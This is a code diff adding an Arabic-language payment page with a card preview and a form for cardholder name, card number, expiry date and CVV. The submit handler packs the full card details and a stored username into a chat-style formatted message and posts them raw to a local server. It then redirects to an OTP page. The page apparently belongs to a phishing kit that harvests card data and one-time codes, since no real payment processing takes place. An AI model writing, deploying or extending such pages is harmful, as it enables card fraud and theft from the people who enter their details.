@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>صفحة الدفع</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(to right, #ffffff, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .payment-card {
+      background-color: #fff;
+      width: 400px;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(1, 1, 1, 1.1);
+      transition: transform 0.3s;
+    }
+
+    .payment-card:hover {
+      transform: translateY(-5px);
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      color: #333;
+      text-align: center;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 700;
+      color: #444;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .input-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn-pay {
+      background-color: #006a8f;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    .btn-pay:hover {
+      background-color: #005b7a;
+    }
+
+    .card-preview {
+      background: linear-gradient(135deg, #174578, #006a8f);
+      color: #fff;
+      padding: 40px 20px;
+      border-radius: 15px;
+      margin-bottom: 25px;
+      position: relative;
+      box-shadow: inset 0 0 30px rgba(255, 255, 255, 0.05);
+      font-size: 18px;
+      height: 150px;
+    }
+
+    .card-number,
+    .card-name,
+    .card-expiry {
+      margin: 5px 0;
+      font-size: 20px;
+      letter-spacing: 2px;
+    }
+
+    .visa-logo {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      font-size: 30px;
+      font-weight: bold;
+      opacity: 0.8;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 10px;
+    }
+
+    @media (max-width: 600px) {
+      .payment-card {
+        width: 90%;
+        padding: 20px;
+      }
+
+      .card-preview {
+        padding: 30px 10px;
+      }
+
+      .card-number,
+      .card-name,
+      .card-expiry {
+        font-size: 18px;
+      }
+
+      .visa-logo {
+        font-size: 24px;
+      }
+    } 
+
+    #img2020 { 
+    width: 15px;
+    height: 15px;
+    transition: transform 0.3s ease; /* تأثير الانتقال */
+    cursor: pointer; /* يد تظهر عند التمرير على الصورة */
+}
+
+  </style>
+</head>
+<body>
+
+  <div class="payment-card">
+    <div class="card-preview">
+      <div class="card-number" id="previewCardNumber">**** **** **** ****</div>
+      <div class="card-name" id="previewCardName">الاسم الكامل</div>
+      <div class="card-expiry" id="previewCardExpiry">00/00</div>
+      <div class="visa-logo">VISA</div>
+    </div>
+
+    <h2>تفاصيل الدفع</h2>
+    <form id="paymentForm">
+      <div class="input-group">
+        <label for="cardName">اسم حامل البطاقة</label>
+        <input type="text" id="cardName" placeholder="">
+      </div>
+
+      <div class="input-group">
+        <label for="cardNumber">رقم البطاقة</label>
+        <input type="text" id="cardNumber"inputmode="numeric" placeholder="**** **** **** ****">
+      </div>
+
+      <div class="input-row">
+        <div class="input-group" style="flex: 1;">
+          <label for="expiry">تاريخ الانتهاء</label>
+          <input type="text" id="expiry"inputmode="numeric" placeholder="MM/YY">
+          <div class="error-message" id="errorMessageMonth">يرجى ادخال تاريخ صالح</div>
+          <div class="error-message" id="errorMessageYear">يجب ادخال السنة الصحيحه </div>
+        </div>
+        <div class="input-group" style="flex: 1;">
+            <label for="cvv">CVV <img id="img2020" src="images.png" alt="CVV Icon"></label>
+            <input type="text" id="cvv"inputmode="numeric" placeholder="">
+        </div>
+      </div>
+
+      <button type="submit" class="btn-pay">إتمام الدفع</button>
+    </form>
+  </div>
+
+  <script>
+   document.addEventListener("DOMContentLoaded", function() {
+    const img2020 = document.getElementById("img2020");
+
+    img2020.addEventListener("click", function(event) {
+        event.stopPropagation();
+        img2020.style.transform = "scale(3)";
+    });
+
+    document.addEventListener("click", function() {
+        img2020.style.transform = "scale(1)";
+    });
+
+  const cardNumberInput = document.getElementById('cardNumber');
+cardNumberInput.addEventListener('input', function () {
+    let digits = this.value.replace(/\D/g, '').slice(0, 16);
+    const formatted = digits.replace(/(.{4})/g, '$1 ').trim();
+    this.value = formatted;
+    document.getElementById('previewCardNumber').textContent = formatted || '**** **** **** 3456';
+});
+
+
+    const cardNameInput = document.getElementById('cardName');
+    cardNameInput.addEventListener('input', function () {
+        document.getElementById('previewCardName').textContent = this.value.length ? this.value : 'الاسم الكامل';
+    });
+
+    const cvvInput = document.getElementById('cvv');
+    cvvInput.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, '').slice(0, 3);
+    });
+
+  const expiryInput = document.getElementById('expiry');
+expiryInput.addEventListener('input', function () {
+    let input = this.value.replace(/\D/g, '');
+    if (input.length >= 2) {
+        input = input.slice(0, 2) + '/' + input.slice(2);
+    }
+    if (input.length > 5) {
+        input = input.slice(0, 5);
+    }
+    this.value = input;
+    document.getElementById('previewCardExpiry').textContent = input || '12/26';
+});
+
+
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const errorMessageMonth = document.getElementById('errorMessageMonth');
+        const errorMessageYear = document.getElementById('errorMessageYear');
+        errorMessageMonth.style.display = 'none';
+        errorMessageYear.style.display = 'none';
+
+        const expiryValue = document.getElementById('expiry').value;
+        const currentDate = new Date();
+        const currentMonth = currentDate.getMonth() + 1;
+        const currentYear = currentDate.getFullYear() % 100;
+
+        const [inputMonth, inputYear] = expiryValue.split('/').map(num => parseInt(num, 10));
+
+        if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
+            errorMessageYear.style.display = 'block';
+        } else {
+  const cardNumber = document.getElementById('cardNumber').value;
+const cardName = document.getElementById('cardName').value;
+const cvv = document.getElementById('cvv').value;
+const expiry = document.getElementById('expiry').value;
+
+const name = localStorage.getItem("storedUserName"); // ✅ استرجاع الاسم مباشرة
+
+const message = `
+💳 <b>تفاصيل الدفع - بطاقة الائتمان</b>
+
+<b>👤 من:</b> ${name}
+<b>🧑‍💼 اسم حامل البطاقة:</b> ${cardName}
+<b>🔢 رقم البطاقة:</b> ${cardNumber}
+<b>📅 تاريخ الانتهاء:</b> ${expiry}
+<b>🔐 CVV:</b> ${cvv}
+`;
+
+            // ✅ إرسال إلى الخادم المحلي
+            fetch('http://localhost:3000/api/payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    name: name,
+                    cardName: cardName,
+                    cardNumber: cardNumber,
+                    cvv: cvv,
+                    expiry: expiry,
+                    message: message,
+                    type: 'visa_card'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال البيانات:', data);
+                // الانتقال إلى صفحة OTP
+                window.location.href = "otp.html";
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء إرسال البيانات:', error);
+            });
+        }
+    });
+});
+
+  </script>
+  
+</body>
+</html>
